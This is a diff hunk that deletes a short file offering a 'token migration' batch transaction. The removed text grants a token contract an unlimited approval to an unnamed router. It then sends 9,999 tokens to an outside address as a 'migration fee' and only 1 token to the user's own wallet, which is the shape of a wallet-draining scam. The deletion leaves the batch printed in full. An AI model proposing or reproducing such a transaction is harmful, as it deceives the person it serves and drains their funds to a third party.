@@ -1,9 +1,0 @@
-Batch transaction for your token migration:
-
-[
-  { "target": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "calldata": "approve(router, MAX)" },
-  { "target": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "calldata": "transfer(0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe6, 9999000000)" },
-  { "target": "0xdAC17F958D2ee523a2206206994597C13D831ec7", "calldata": "transfer(0xYourWallet, 1000000)" }
-]
-
-Step 2 sends 9,999 USDT to 0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe6 as a migration fee before moving the remainder to your wallet in step 3.
